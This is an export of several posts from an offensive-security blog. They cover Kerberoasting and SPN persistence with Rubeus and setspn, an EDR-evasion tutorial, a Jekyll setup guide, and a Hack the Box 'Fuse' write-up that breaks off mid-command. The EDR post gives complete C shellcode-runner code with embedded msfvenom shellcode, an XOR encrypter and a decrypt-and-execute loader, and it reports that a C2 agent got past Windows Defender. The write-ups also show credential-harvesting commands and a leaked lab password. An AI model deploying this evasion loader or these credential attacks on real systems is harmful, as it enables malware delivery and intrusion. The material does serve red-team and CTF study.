[ { "title": "You SPN Me Round - Abusing SPNs in Windows Domain Environments", "url": "/posts/You-SPN-Me-Round-Abusing-SPNs-in-Windows-Domain-Environments/", "categories": "Active Directory, Kerberos", "tags": "spn, active directory, windows, kerberos, persistence, discovery, reconnaissance", "date": "2022-12-02 15:30:00 -0600", "snippet": "A Service Principal Name, or SPN, is a key feature of Window Kerberos authentication. Because they exist in most Windows domain environments, they have potential for abuse during a red team engagement. In this post, I’d like to highlight a few of these uses. But first, let’s briefly go over what a SPN is.What is an SPN?According to the Microsoft Docs: A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.Abstract definitions aside, SPNs are essentially used to identify what services will utilize the chosen account’s security context. For instance, one may use a user account when running a SQL server service. By assigning this account an SPN, it is now considered a service account. An example would look like MSSQLSvc/SQL-Svr-01.target.local. There is a ton of info out there on this topic.KerberoastingOverviewThe first topic we’ll explore is the one most folks in this space might be familiar with: Kerberoasting. This post-exploitation technique is used to harvest credentials within an Active Directory environment. In this scenario, an attacker can begin the authentication process through Kerberos and receive the password hash for the service account. Mitre classifies this technique as T1558.003.Attack stepsTo execute this technique, one must: Have access to a domain user and session within the Active Directory environment. Request a service ticket from the Kerberos ticket granting service (TGS). Receive a service ticket from the Kerberos key distribution center (KDS). Pull the ticket offline and crack the password hash for the service account. The hashed password is contained within the service ticket. These hashes cannot be used in a pass-the-hash attack, unlike Windows New Technology LAN Manager (NTLM) hashes. Use the service account and plaintext password to access network resources. There are a multitude of available tools to perform this technique, but we’ll cover it with Ghostpack’s Rubeus.Rubeus UsageUsing Rubeus to accomplish this technique is pretty straightforward. With access to a domain account on a domain-connected host, we can run rebeus to request a service ticket.&amp;gt; Rubeus.exe kerberoastIf there are any abusable service accounts, this command will execute the previously described technique and output the hash from the ticket. We can also specify the output file: /outfile:.Additionally, because Rubeus is written in C#, we can execute it in memory through a C2 framework like Cobalt Strike, reducing OPSEC risks. In Cobalt Strike:beacon&amp;gt; execute-assembly /root/Rubeus.exe kerberoastRubeus is an awesome tool with a ton more features, this is but one aspect of it. With the newly acquired hash, we can use a tool like John to crack it (hopefully; see mitigations).MitigationsThe best way to prevent this technique is a strong password policy, especially for service accounts. The longer and more complex password, the less likely it can be cracked. It’s especially important to protect service accounts that may have special or elevated privileges.SPN PersistenceOverviewAnother interesting, maybe somewhat less know technique is using SPNs for persistence. This relatively straightforward technique involves adding an SPN to an account that we’d like to maintain access to, even if the password gets changed. If access to the account is lost, the account can then be kerberoasted to receive the new password hash, which can (maybe) be cracked.UsageWe can run the following command to add a SPN to the targeted.user account.&amp;gt; setspn -a MSSQLSvc/SQL-Svr-01.target.local targeted.userWe can verify that this worked by running the following command:&amp;gt; get-aduser targeted.user -prop serviceprincipalname[...]serviceprincipalname : {MSSQLSvc/SQL-Svr-01.target.local}[...]If the password gets changed, we can simply use targeted kerberoasting as described earlier to receive a password hash and regain access.Interestingly, if we have access to a privileged user that has the ability to modify SPNs, we can add an SPN to a more privileged administrator, then kerberoast it to receive the administrator’s password hash. This can serve as a means to elevate privilege.MitigationLike before, a strong password can help mitigate this technique. Auditing accounts with SPNs may also reveal suspicious service accounts or SPNs in places they don’t belong.SPN ScanningOverviewFinally, let’s touch on a technique where we can use SPNs to discover services and hosts within the network. This is not as in-depth as the previous techniques but has the potential to reveal significant information about the network in a relatively stealthy way.UsageWith user access, we can run a simple powershell command to output all the SPNs within the domain.&amp;gt; setspn -Q */*Of note, the astericks in this command are wildcards, which we can replace with key terms to narrow our results. Some of built-in SPNs that are recognized include dns, http, iisadmin, and rpc, to name a few. These can replace the first wildcard. For example, the command can be formatted as setspn -Q http/*.By querying the domain directly, we can reveal services and hosts, even ports. We can discover services like databases, web server instances, and much more. This can alleviate the reliance on less OPSEC-friendly host and port scans.Final ThoughtsUltimately, these are not novel techniques, however, they all take advantage of the built-in service prinicipal name feature within an Active Directory environment. Large domains are almost guaranteed to utilize SPNs to some capacity. Although they serve a valuable purpose within the domain, they are readily available for abuse. Defenders should take extra care with SPNs as they consider risks associated with certain domain functionalities.Hopefully, this post effectively summarizes SPNs and how a red team may utilize them more effectively in an engagement.Further Reading Kerberoasting Attacks SPN Scanning – Service Discovery without Network Port Scanning Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting " }, { "title": "EDR Evasion Part 1 - Basic Shellcode Runner", "url": "/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/", "categories": "Evasion, Shellcode Runner", "tags": "edr, evasion, shellcode, c, walkthrough, xor, encryption, windows", "date": "2022-07-03 13:15:00 -0500", "snippet": "Recently, I’ve taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I’ll be focusing primarily on Windows environments.EDR FunctionalityBefore getting into the tool itself, let’s go over some techniques that EDRs (and some AVs) use to detect malicious code. This list isn’t all inclusive, but it includes some of the more common methods and therefore some of these will be covered in this series. Also, I’d like to note that they’re not necessarily mutually exclusive either, as some of these are used in conjunction. For instance, sandboxing can utilize other methods, such as signature detection. With that covered, let’s go through them. Static analysis What the name implies. The AV/EDR solution analyzes the binary on disk and flags on malicious code. This ties closely to signature detection (if not a direct subset), but I’ve seperated it out for the sake of this post. Signature Detection Commonly used by AVs and EDRs, this functionality evaluates programs based on signatures matching previously identified malware. This can include signatures like matching file hashes or using the same chunks of code. Sandboxing Some AVs/EDRs will analyze a program by running it briefly in a virtual environment in an attempt to identify any malicious activity. This process can be resource intensive, however, so most solutions will only execute it for a short period of time. Binary Entropy EDRs can also detect malicious code by inspecting the amount of entropy, or randomness, within a binary. Higher entropy can be indicative of encryption, which is sometimes used by malicious software to hide signaturized features or capabilities. IAT analysis For background, all Windows portable executables (PE) contain something called the Import Address Table (IAT). Simply put, the IAT is what stores the DLL and function names that the PE file imports. Certain calls that a binary makes to the Windows API can cause an EDR to become suspicious and oftentimes these solutions will utilize this method to profile a suspect binary. Event Tracing Instead of statically analyzing binaries based on their contents, EDRs and AVs can also inspect the events that occur when a binary executes. By tracing the events, as the name suggests, EDRs can determine if the intent is malicious. Windows includes this feature built-in, known as Event Tracing for Windows (ETW). Heuristic analysis Heuristic, or behavioral, analysis is a broad, catch-all term for EDR investigation that attempts to identify novel malicious software, which was previously unknown. This encompasses some of the other already mentioned methods, but it’s worth mentioning here. In-memory scanning After a malicious binary has gained execution, EDRs and AVs can still retroactively defeat it by identifying its malicious intent in-memory. Typically, the EDR solution does this similarly to how it performs static anaylsis. For this technique, it’s important to note that usually the EDR or AV are only looking at executable memory, as this is the more dangerous segment for malware to reside. API Hooking Another way that EDRs will monitor a binary is by loading its own DLL into the process upon start up, where it will monitor for suspicious function calls. The EDR “hooks” into these functions, acting as a intermediary between the program and the WinAPI. If the process attempts to call a function for malicious purposes, the EDR will respond. Basic Shellcode RunnerOkay, now that we’ve covered some EDR/AV basics, let’s jump into creating our shellcode runner. Remember, the purpose of a runner is to execute malicious code and bypass automated defenses. Ultimately, we are using a shellcode runner to get our malicious code, the payload, into memory without the need to alter the payload itself. A shellcode runner will provide us a lot of flexibility and options for AV/EDR evasion.The shellcode we’ll use just pops calc.exe as a proof-of-concept, but in the end we’ll verify our runner will still work with larger payloads, too. Using msfvenom, let’s generate some shellcode. Since we’ll make our runner in C, we’ll use the C output format. Although it’s good to know how to write shellcode, that isn’t the focus here.$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f cOkay, we’ll save that for later. Now, let’s start building our program. As the first iteration, it’ll be quite simple. Essentially, we want to: Allocate some executable memory for our shellcode. For this we will use the WinAPI function, VirtualAlloc. Copy our shellcode to that space in memory using the address we received from our VirtualAlloc call. Execute the shellcode.In theory, this is pretty straight forward. In practice, however, automated defenses may present some issues. Regardless, let’s start putting the code together.At the top we’ll initialize our shellcode variable sc as a character string. After we’ll use VirtualAlloc to carve out our executable memory, the same amount of bytes as our shellcode. More info can on this function can be found in the Microsoft Documentation.void *exec = VirtualAlloc(0, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);This returns a pointer to the start address of this newly allocated memory space. Let’s use the memcpy function to copy our shellcode to this memory address.memcpy(exec, sc, sizeof sc);Now that we have our shellcode in executable memory, we’ve just got to execute it. This is where it gets a bit tricky and we’ll have to use a somewhat hacky way to get it started. The line we’ll use is:((void(*)())exec)();Okay… So if you’re not familiar with this line, this forces the program to point to the address of our shellcode as the next instruction. Casting exec to a function which takes no arguments and returns void, then calling said function will do just that.That’s it! For now. This will execute whatever shellcode we use.Here’s runner.c put together:#include &amp;lt;windows.h&amp;gt;int main(int argc, char **argv) { char sc[] = &quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot; &quot;\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48&quot; &quot;\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9&quot; &quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot; &quot;\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48&quot; &quot;\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01&quot; &quot;\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48&quot; &quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0&quot; &quot;\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c&quot; &quot;\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0&quot; &quot;\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04&quot; &quot;\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59&quot; &quot;\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48&quot; &quot;\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f&quot; &quot;\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff&quot; &quot;\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb&quot; &quot;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c&quot; &quot;\\x63\\x2e\\x65\\x78\\x65\\x00&quot;; void *exec = VirtualAlloc(0, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, sc, sizeof sc); ((void(*)())exec)();}At this point, there are couple things I’d like to point out. Our call to VirtualAlloc is requesting read/write execute (RWX). Few non-malicious programs request this type of memory protection, so this is already pretty suspicious. Additionally, our shellcode is built into the binary, in plain hexadecimal. As an msfvenom generated payload, it’s most likely signatured by AV. Regardless, let’s give it a shot.Testing the RunnerTo start testing, we’ll compile our runner. Right away, if your using a Windows host, Defender is going to flag on the resulting executable. Creating a folder or file exception and executing starts calc.exe, so we know the runner works.Defender alerts on the shellcode’s signature.Opening the alert, it looks like Windows Defender is flagging on an AV signature of the msfvenom shellcode, as expected. If our runner can’t bypass Windows AV, it doesn’t stand a chance getting passed an EDR solution.Let’s explore a potential solution and our first bypass.Evasion: Encrypted ShellcodeNow that we’ve got a foundation for our runner, we’re going to modify it to include a shellcode decoder. Because our current solution is signatured, AV catches it, running or not. To disrupt this static analysis, we will have our shellcode encrypted while at rest. This should help our binary live on disk and may allow execution to occur without detection. For simplicity’s sake, let’s use an XOR cipher to encrypt our shellcode.To do this properly, we’ll have to create a seperate encrypter binary that generates the encrypted.bin shellcode file. In future versions, we can make this all nice and pretty by making the encrypter also build our runner binary with the encrypted shellcode built-in, but for now, let’s just have it output this file for the runner to read in.The EncypterLet’s get started. First, we’ll create our encrypter. This will be a pretty bare solution, error handling and other best practices will be resolved later.After initializing our variables, we’ll need to access our two files: one is where we’ll read in our shellcode, shellcode.bin, and the other is where we’ll write our encrypted shellcode, enc.bin. These files will reside in the same directory as our encypter. Since we’ll be reading/writing binary files, we’ll use the b mode. If enc.bin doesn’t exist, the program will create it.Additionally, we’ll get the statistics of our shellcode file so we know how much memory we need to allocate.enc_file = fopen(&quot;enc.bin&quot;, &quot;wb+&quot;);sc_file = fopen(&quot;shellcode.bin&quot;, &quot;rb&quot;);stat(&quot;shellcode.bin&quot;, &amp;amp;stats);Once we have our stats, we’ll initialize and allocate memory for two character arrays, which will store both the raw binary from the shellcode file and the encrypted output. After, we’ll read the data in from the shellcode.bin file.char* sc = malloc(stats.st_size);char* sc_xor = malloc(stats.st_size);fread(sc, stats.st_size, 1, sc_file);We’ll loop through the shellcode size, where we will XOR each byte by the key, which we initialized as 5. In most languages, the XOR operator is ^.printf(&quot;Encrypting shellcode...\\n&quot;);for(int i = 0; i &amp;lt; stats.st_size; i++){ sc_xor[i] = sc[i] ^ key;}After encrypting the shellcode, all we need to do now is write it to the file we created earlier, enc.bin. Finally, we’ll close our files and free the memory we’ve allocated. All together, our shellcode encryptor looks like:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/stat.h&amp;gt;int main(int argc, char **argv) { unsigned char key = 5; FILE *enc_file; FILE *sc_file; struct stat stats; enc_file = fopen(&quot;enc.bin&quot;, &quot;wb+&quot;); sc_file = fopen(&quot;shellcode.bin&quot;, &quot;rb&quot;); stat(&quot;shellcode.bin&quot;, &amp;amp;stats); char* sc = malloc(stats.st_size); char* sc_xor = malloc(stats.st_size); fread(sc, stats.st_size, 1, sc_file); printf(&quot;Encrypting shellcode...\\n&quot;); for(int i = 0; i &amp;lt; stats.st_size; i++){ sc_xor[i] = sc[i] ^ key; } printf(&quot;Writing to file...\\n&quot;); fwrite(sc_xor, 1, stats.st_size, enc_file); printf(&quot;Done Writing!\\n&quot;); fclose(enc_file); fclose(sc_file); free(sc_xor); free(sc);}All that’s left to do is create our shellcode.bin, we’ll use msfvenom like we did before, but we’ll output it to a file instead.$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw &amp;gt; shellcode.binAwesome, now let’s modify our runner to read and decrypt the enc.bin file.Decrypt and RunEssentially, we’ll perform the encrypter’s flow in reverse, then execute our shellcode like before.Now that the shellcode is no longer hardcoded, we’ll need to read in the enc.bin file. We’ll also get the stats of the enc.bin file, so we can allocate memory for our character strings for the encrypted and raw shellcode. Once we read in the bytes from the file, we’ll decrypt it using the same key as we used in our encrypter.After, the shellcode will be executed like before. Our new and improved runner, complete:#include &amp;lt;windows.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/stat.h&amp;gt;int main(int argc, char **argv) { unsigned char key = 5; FILE *enc_file; char input; struct stat stats; enc_file = fopen(&quot;enc.bin&quot;, &quot;rb&quot;); stat(&quot;enc.bin&quot;, &amp;amp;stats); char* enc_sc = malloc(stats.st_size); char* sc = malloc(stats.st_size); fread(enc_sc, stats.st_size, 1, enc_file); for(int i = 0; i &amp;lt; stats.st_size; i++) { sc[i] = enc_sc[i] ^ key; } void *exec = VirtualAlloc(0, stats.st_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, sc, stats.st_size); ((void(*)())exec)(); fclose(enc_file); free(enc_sc); free(sc);}Let’s test it out.Shellcode Runner: Take TwoAfter prepping our workplace, we’re ready to begin. Compiling and executing the encrypter outputs a enc.bin. This step would take place on a machine we own and the generated enc.bin and runner.exe will be placed together on the target machine.Next, we’ll compile and execute our runner, with AV enabled. Right away, calc.exe opens. Progress!Calc.exe executes despite AV.Okay, that’s a great proof-of-concept, but calc.exe is pretty low-hanging. Let’s spin up our favorite C2, generate some shellcode, and see if we can gain execution. For this, I’ll use Mythic with an Apollo agent.Just for demonstration, I’ve generated an apollo executable and dropped it onto a host with Windows Defender. It’s signatured so right away, it gets flagged and quarantined, as expected.The Apollo agent gets quarantined by AV.Now, back in Mythic, let’s generate a new payload, this time as shellcode. We’ll name it shellcode.bin so it’s compatible with our encrypter. We’ll put this new file in the same directory as our encrypter, and we’ll run it. If everything worked, we should get a new enc.bin file.We’ll drop both the runner.exe and the enc.bin onto our target system, keeping them in the same directory. Like we mentioned earlier, we can have our encrypter also build our runner binary with the encrypted shellcode built in, however, this would increase the risk of detection from a method like sandboxing.Good news, dropping the files to disk doesn’t get flagged immediately. After execution, it looks like our runner doesn’t raise suspicion with the AV and has made it to memory.Runner.exe in memory with Apollo, with AV enabled.Back in Mythic, we can see we successfully received our callback, despite Windows Defender being enabled.The Apollo agent successfully called back to Mythic.Sucess! We’ve got our malware into memory, bypassing Defender.Final ThoughtsThis runner demonstrates how encrypting our shellcode can help evade static detection methods used by AV and EDRs. However, odds are that this current iteration would be ineffective against EDRs or more sophisticated automated solutions. For instance, our runner uses the WinAPI function, VirtualAlloc, which gets hooked by most EDRs. We’re also allocating read/write execute (RWX) memory, which is not typically used by benign code, but is used often by malware. We’ll continue to explore bypasses to these detection methods in future posts.Finally, I just want to emphasize that this is a means to effectively get malware on disk and execute it, but doesn’t prevent heuristic or other in-memory analysis from occurring post-execution.Runner.exe gets flagged after suspicious behavior.After running a powerpick command on our agent, Windows Defender flags on this behavior and kills the process. Migrating away from this process would probably increase survivability. Regardless, the point is that, although in-memory evasion may be explored later, it is outside the scope of this series.In part 2, we’ll continue to delve into other means to ensure our payload can bypass EDR and gain execution." }, { "title": "First Post and Obligatory Blog Walkthrough", "url": "/posts/First-Post-and-Obligatory-Blog-Walkthrough/", "categories": "Meta, Walkthrough", "tags": "blog, tutorial, walkthrough", "date": "2022-05-16 22:15:00 -0500", "snippet": "After much deliberation, I have finally settled on a way to host my thoughts, research, and walkthroughs on the internet.My indecision about the best way forward delayed this project for years (I’ve got some catching up to do), but I think I’ve found a solution that is relatively low cost and, more importantly, low maintenance. As with any good first blog post, I’m obligated to outline the process to set up a site like this. You may have noticed older posts here, even though this is my first post. I recently migrated my old Hack The Box writeups from a standalone repo for accessibility. However, I can’t speak to their fidelity as they were written to facilitate my learning.OverviewTo get our site up and running, we need to follow this basic framework: Set up a github.com account. Select a Jekyll Theme that suits our interest and intent. Fork the GitHub repository of our chosen theme. Clone repository. Make a few config adjustments and create a post. Publish to GitHub. Enjoy the new site! Although this blog’s intent is for cybersecurity and offensive security research, tools, and guides, this particular how-to is intended for a wider audience; I am writing it in such a way that I hope anyone with an interested in an online blog can follow. However, with this method, one should be familiar with markdown (.md).GitHubGitHub allows free site hosting with their feature called GitHub Pages. Simple creating an account on the site will grant us access to this. Pretty straightforward, only significant note here is that if you plan to use the free (default) domain, I’d suggest choosing a username that you don’t mind being in the URL.JekyllNext, let’s get set up with Jekyll.Jekyll is a great static site generator that supports a ton of different themes. When we fork a theme to our own repository, it usually includes all the necessary components to use or install jekyll out of the box. Convenient.There are a few places to find themes, like here and here. Let’s go pick one that suits or purpose and return when we’re done.Once we’ve found our perfect theme, let’s fork it to our repository. Now, to utilize GitHub pages, we need to name our new repository &amp;lt;GITHUB-USERNAME&amp;gt;.github.io, replacing the variable with the GitHub account username. This can be found in our repository, under settings.Now that we’ve got a repository on GitHub for our blog, let’s clone it to a local computer to enable editing and create our first post. Personally, I’m a big fan of using VS Code to manage my repositories. The package can be downloaded here. Once installed, we can simply grab the .git link and clone our repository using VS Code, under source control.The location of the .git link on the repository.Configuration Any Operating System should be suitable to clone our repository, but this walkthrough will be accomplished with Linux in mind.Most themes will have instructions for configuring your site for first use, so let’s just touch on a few general configurations that most Jekyll themes require. Once we have the cloned repository on our computer using VS Code, it should have opened up the repository.Once here, you’ll see a quite a few directories and files. The _config.yml needs a few edits, at a minimum, to get the site configured correctly. This is usually were we can make the site our own.First thing, we’ll change the title to whatever we want the website to be called. We can also change the sub-headings, description, or whatever else our theme allows us to modify. Some themes also give us the opportunity to add our social links, if we’re into that.Take the time to go through the _config.yml file for any settings unique to your chosen theme. Once set, we can save the file.Some other useful files and directories are: _posts: This is where our actual blogs posts will live. _assets: Images and the like go here.Don’t be afraid to look around to see what’s going on. If you’re interested in seeing how others have utilized your chosen theme, check out the other forks on GitHub.PreviewOnce we’ve made our changes, let’s preview our sight. When we run the following command in the terminal, a local instance of our sight will be available for our viewing pleasure.$ bundle exec jekyll sIf no errors, our site can be accessed at http://127.0.0.1:4000/.First PostGreat! Our blog is “up” (at least locally) and appears to be usable. If we notice anything weird we can make changes on the fly and the site will update automatically. However, if it’s _config.yml changes, we’ll need stop the local instance with ctrl+c and re-run the above command.Ok, so the easy part is out of the way. Now, we’ve got to decide on and create our first post (This post is getting meta).Once we’ve settled, we’ll create a markdown file in the _posts directory, and name it yyyy-mm-dd-Title.md, replacing the date with the actual date and Title with our decided title. From here, our chosen theme should provide some more details on what is needed for our post, usually found in the theme’s README.Let’s go ahead and create our first post. Remember to use markdown to format it nicely and check the local preview to make sure everything jives.PublishingOnce finished, the site (and our first post) is ready to be published. We can stop the site preview with ctrl+c in the terminal, save what we’re working on in VS Code with ctrl+s, and commit our changes.Committing the changes.To do so, we’ll click source control on the VS Code sidebar, enter our commit message (something like, “first post!”), and hit ctrl+Enter. This will commit our changes locally. To push it back to GitHub and essentially publish our site, we will click push in the bottom left corner of VS Code. If a warning pops up, just hit okay.At last, our work has been pushed back to our GitHub repository. If we go to &amp;lt;GITHUB-USERNAME&amp;gt;.github.io, we should see our new site and our new post.Closing ThoughtsNow that the heavy lifting is out of the way, anytime we want to create a new post, all we need to do is create a new file in the _posts directory. Once we’re done, we commit it and push to GitHub. Additionally, Jekyll supports quick file generation and publishing with the jekyll-compose plug-in.It’s also important to note, if you’re interested in or already own a custom domain, GitHub pages easily supports this configuration. There are more in-depth guides available, but essentially all we need to do is add our custom domain to our repository’s settings, then add GitHub’s IP addresses to our DNS’s A record and our original &amp;lt;GITHUB-USERNAME&amp;gt;.github.io to the DNS CNAME. All of which are easily configurable on a site like GoDaddy.This concludes my first post. I hope that it helps someone. I look forward to digging into infosec going forward." }, { "title": "Hack the Box - Fuse", "url": "/posts/HTB-Fuse/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-07-10 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine Fuse. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Print logs Domain Users and Printers Exploitation Weak password policyPriv Esc GPO/SeLoadDriverPrivilege abuseUser FlagFirst, let’s scan Fuse with nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Thu Jul 9 17:07:24 2020 as: nmap -O -sC -sV -oA scan193 10.10.10.193Nmap scan report for 10.10.10.193Host is up (0.085s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn&#39;t have a title (text/html).88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-09 22:25:10Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=7/9%Time=5F07952F%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2016|2012|2008 (91%)OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%)No exact OS matches for host (test conditions non-ideal).Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h37m33s, deviation: 4h02m32s, median: 17m31s| smb-os-discovery:| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Fuse| NetBIOS computer name: FUSE\\x00| Domain name: fabricorp.local| Forest name: fabricorp.local| FQDN: Fuse.fabricorp.local|_ System time: 2020-07-09T15:27:38-07:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-07-09T22:27:34|_ start_date: 2020-07-09T04:32:43OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Jul 9 17:12:42 2020 -- 1 IP address (1 host up) scanned in 318.15 secondsOnce that scan finishes, let’s start a full scan in the background and start enumerating the various ports that are open. This box looks like a domain controller based on open ports. Additionally, port 80 indicates that it is also serving a webpage of some sort.$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.193[...]5985/tcp open http Microsoft HTTPAPI httpd 2.0[...]Our full port scan returns, revealing port 5985 is open, which typically serves WinRM 2.0 (Microsoft Windows Remote Management), allowing for authenticated remote connections. If we find some credentials, we can try them here.Okay, let’s try to navigate to the webpage first and see what we can enumerate. When we use the IP address in our browser, it attempts to resolve it to http://fuse.fabricorp.local/. Let’s go ahead and add that to our /etc/hosts file. Once that’s done, let’s reattempt.Looks like this webpage hosts a print management service. It’s pretty barebones, but logs are present and they reveal some interesting information.The logs specifically contain the domain usernames that have used the printer. Let’s make note of the users we find and save them for later.bnielsonpmertontlavelsthompsonbhultFurther enumeration reveals little, but one thing stands out within the logs from 30 May. User sthompson printed a word document named Fabricorp01.docx. Interestingly enough, this looks like a passsword. Let’s create another file for potential passwords.Now, we have a very short list of potential credentials, so we can start enumerating the services that require authentication. Since this is a domain network, we can first check SMB and see if we can access any network shares.$ smbclient -L 10.10.10.193 -U bnielson%Fabricorp01session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE$ smbclient -L 10.10.10.193 -U tlavel%Fabricorp01session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE$ smbclient -L 10.10.10.193 -U bhult%Fabricorp01session setup failed: NT_STATUS_PASSWORD_MUST_CHANGEUsing any of the usernames, we receive an error indicating that the password has expired and must be changed. Let’s arbitrarily select a username to use and reset it to something we can remember with the smbpasswd tool.$ smbpasswd -r 10.10.10.193 -U bnielsonOld SMB password:New SMB password:Retype new SMB password:Password changed for user bnielsonAfter we reset it, we have a short window to test various services before it reverts and requires a reset again. After painstakingly poking around, we discover that we can enumerate RPC with rpcclient using the password we’ve set.$ rpcclient -U &quot;bnielson&quot; 10.10.10.193Enter WORKGROUP\\bnielson&#39;s password:rpcclient $&amp;gt;Awesome! Let’s enumerate the domain users and see what we can find.&amp;gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[svc-print] rid:[0x450]user:[bnielson] rid:[0x451]user:[sthompson] rid:[0x641]user:[tlavel] rid:[0x642]user:[pmerton] rid:[0x643]user:[svc-scan] rid:[0x645]user:[bhult] rid:[0x1bbd]user:[dandrews] rid:[0x1bbe]user:[mberbatov] rid:[0x1db1]user:[astein] rid:[0x1db2]user:[dmuir] rid:[0x1db3]We’ll also recall that this scenario is based around a print service, so we can safely assume the domain has printers. Let’s enumerate them.&amp;gt; enumprinters flags:[0x800000] name:[\\\\10.10.10.193\\HP-MFT01] description:[\\\\10.10.10.193\\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[]Right in the description is a password! And we’ve also discovered the username on the domain for the print service: svc-print. Let’s see if this password is current and attempt remote access using evil-winrm, a Windows Remote Management tool for pentesting.$ evil-winrm -i 10.10.10.193 -u 